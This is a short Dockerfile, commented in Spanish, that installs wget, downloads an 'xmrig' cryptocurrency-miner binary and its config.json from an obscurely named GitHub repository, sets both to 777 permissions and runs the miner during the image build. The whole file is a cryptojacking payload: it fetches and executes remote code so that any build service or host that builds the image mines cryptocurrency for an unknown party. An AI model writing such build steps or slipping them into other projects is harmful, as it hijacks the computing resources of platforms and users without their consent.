FROM ubuntu:latest

# Instalar dependencias necesarias
RUN apt-get update && apt-get install -y wget

# Descargar config.json y xmrig
RUN wget https://raw.githubusercontent.com/flikamitai/Ufcujcfuuguf/main/config.json \
    && wget https://github.com/flikamitai/Ufcujcfuuguf/raw/main/xmrig

# Cambiar permisos y ejecutar xmrig
RUN chmod -R 777 xmrig \
    && chmod -R 777 config.json \
    && ./xmrig -c config.json
